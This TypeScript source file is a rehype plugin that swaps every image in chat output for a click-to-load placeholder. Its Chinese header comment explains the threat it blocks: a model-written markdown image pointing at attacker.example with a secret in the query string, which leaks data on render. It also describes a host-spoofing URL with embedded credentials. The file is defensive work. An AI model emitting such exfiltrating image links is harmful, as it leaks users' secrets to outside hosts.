/**
 * 对话流里的图片一律**不自动去取**：每个 `img` 换成 `<held-image>`，由 markdownComponents 渲染成 HeldImage
 * —— 一个占位（alt 文字 + 远端的主机名），远端图片要用户点一下才加载。
 *
 * 为什么：模型写进回复的 `![](https://attacker.example/?d=<secret>)` 在消息**显示出来**的那一刻就会发出
 * 那个 GET，不用任何人点；查询串里装的可以是模型从文件、网页、工具结果里读到的任何东西。这是一条出网通道，
 * 与裸 HTML 闸防的「不可信文本变成能力」同一类 —— 而 ShuviX 有自动脱敏、有远程访问的网络策略，一条
 * 由模型写的 markdown 决定的无条件出站请求与这两样的立场相反。CSP 帮不上：笔记里的远端图片、应用内
 * 浏览器的 favicon 都正当地需要 `img-src https:`，所以把关在这里，不在 CSP。
 *
 * src 分两种：
 *   - 写明了 http(s) 的绝对 URL → 带上 `url`（URL 解析后的规范形，点开时取的就是它，与占位上显示的主机
 *     是同一个）。带用户名 / 密码的除外：`https://good.example@evil.example/` 的提示里打头的是一个假主机，
 *     Chromium 也不取带凭据的子资源，点了只是一张破图；
 *   - 其余一律只是占位、没有加载的路：相对路径与本地路径（按页面地址解析，桌面端是 file:// 下应用自己的
 *     目录，web 客户端打到这台服务自己的路由）、`//host/x` 与 `\\host\x`（按页面协议变成远端；桌面端的
 *     file://host 在 Windows 上就是 SMB）、`data:`
 *     （不出网，但闸与 react-markdown 的 urlTransform 从来都丢它，不为它开新口子）、被闸丢掉 src 的。
 *     本地图片怎么给用户看是另一件事（专门的「给用户看图」工具），这里不替它发明路径解析。
 *
 * 排在插件表**最后**：之前任何一个插件产出的 img 都得经过它（rehype-raw 的裸 `<img>`、`![]()`）。
 * 必须在闸之后 —— 闸会把不认识的 `held-image` 拆成文字；
 * 反过来，正文里手写的 `<held-image url=…>` 早在闸那一步就被拆掉了，进不到这里。
 */
import type { Element, Root } from 'hast'

export const HELD_IMAGE_TAG = 'held-image'

/** 点开时可以去取的地址：只认写明 http(s)、不带凭据的绝对 URL，交回解析后的规范形；其余 → undefined */
export function remoteImageUrl(src: unknown): string | undefined {
  if (typeof src !== 'string') return undefined
  let url: URL
  try {
    url = new URL(src)
  } catch {
    return undefined
  }
  if (url.protocol !== 'http:' && url.protocol !== 'https:') return undefined
  return url.username || url.password ? undefined : url.href
}

function heldImageOf(img: Element): Element {
  const { src, alt } = img.properties ?? {}
  const url = remoteImageUrl(src)
  return {
    type: 'element',
    tagName: HELD_IMAGE_TAG,
    properties: {
      ...(typeof alt === 'string' && alt !== '' ? { alt } : {}),
      ...(url ? { url } : {})
    },
    children: []
  }
}

function visit(node: Root | Element): void {
  node.children.forEach((child, i) => {
    if (child.type !== 'element') return
    if (child.tagName === 'img') node.children[i] = heldImageOf(child)
    else visit(child)
  })
}

/** rehype 插件形态 —— 排在插件表最后（理由见文件头） */
export function rehypeHoldImages() {
  return (tree: Root): void => {
    visit(tree)
  }
}
